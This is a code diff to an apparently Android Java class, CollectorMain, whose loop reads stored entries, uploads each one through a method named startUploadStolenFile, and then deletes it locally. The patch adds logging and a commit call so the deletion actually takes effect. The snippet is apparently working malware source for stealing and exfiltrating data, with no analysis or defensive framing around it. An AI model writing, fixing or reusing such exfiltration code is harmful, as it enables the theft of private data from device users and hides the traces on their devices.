@@ -54,13 +54,14 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		try {
 			files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
 		} catch (Throwable e) {
+			e.printStackTrace(System.out);
 			return;
 		}
 		for (String filename:files) {
-			System.out.println(filename);
+			System.out.println("upload:"+filename);
 			try {
 				copyAndClose(new ByteArrayInputStream(sb.getString(filename,"").getBytes(CompatCharsets.UTF_8)), fu.startUploadStolenFile(filename));
-				sb.edit().remove(filename);
+				sb.edit().remove(filename).commit();
 			} catch (Throwable e) {
 				e.printStackTrace();
 				continue;
